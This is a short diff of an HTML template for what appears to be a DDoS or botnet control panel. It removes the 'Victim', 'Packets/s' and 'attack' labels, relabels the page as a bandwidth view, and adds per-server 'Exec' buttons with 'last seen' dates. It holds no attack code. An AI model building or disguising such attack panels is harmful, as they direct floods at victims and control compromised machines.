@@ -34,22 +34,32 @@ table {
 		<div class="container-fluid p-0">
 
 			<h1 class="h3 mb-3">Servers</h1>
-
 			<div class="row">
 				<div class="col-12">
 				  <div class="server-list">
-    <h2>Servers Attack, Total PPS: 0, Expected: 0 Bit/s</h2>
+    <h2>Servers Bandwidth, Total PPS: 0, Expected: 0 Bit/s</h2>
     <table>
       <tr>
         <th>Name</th>
         <th>IP</th>
         <th>Status</th>
-        <th>End time</th>
-        <th>Victim</th>
-        <th>Packets/s</th>
+        <th>OS</th>
+        <th>Date Added</th>
+        <th>Date Last Seen</th>
         <th>Action</th>
       </tr>
       <!-- Repeat the following TR for each server in the list -->
+      {% for server in server_list %}
+      <tr>
+          <td>{{ server.name }}</td>
+          <td>{{ server.ip }}</td>
+          <td>{{ server.status }}</td>
+          <td>{{ server.operating_system }}</td>
+          <td>{{ server.date_added }}</td>
+          <td>{{ server.date_last_seen }}</td>
+        <td><button class="button">Exec</button></td>
+      </tr>
+      {% endfor %}
       <tr>
         <td>TEST #1</td>
         <td>***.***.***.***</td>
@@ -57,7 +67,7 @@ table {
         <td>Not ready for attack</td>
         <td>None</td>
         <td>0</td>
-        <td><button class="button">STOP</button></td>
+        <td><button class="button">Exec</button></td>
       </tr>
       <tr>
         <td>TEST #2</td>
